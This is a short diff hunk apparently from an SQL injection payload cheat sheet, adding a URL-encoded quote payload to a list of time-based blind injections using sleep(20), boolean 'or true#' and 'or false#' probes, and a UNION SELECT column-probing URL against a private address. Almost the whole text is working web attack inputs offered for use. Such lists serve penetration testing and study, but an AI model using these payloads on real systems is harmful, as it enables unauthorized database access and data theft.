@@ -6,6 +6,8 @@ or sleep(20) #
 %2c(select*from(select(sleep(20)))a)
 1 ' or true# 
 1 ' or false#
+'%20'
+
 
 # Check for a row where it's possible to place your output
 http://10.10.10.10/vul.php?id=1 union all select 1,2,3,4,5,6,7,8
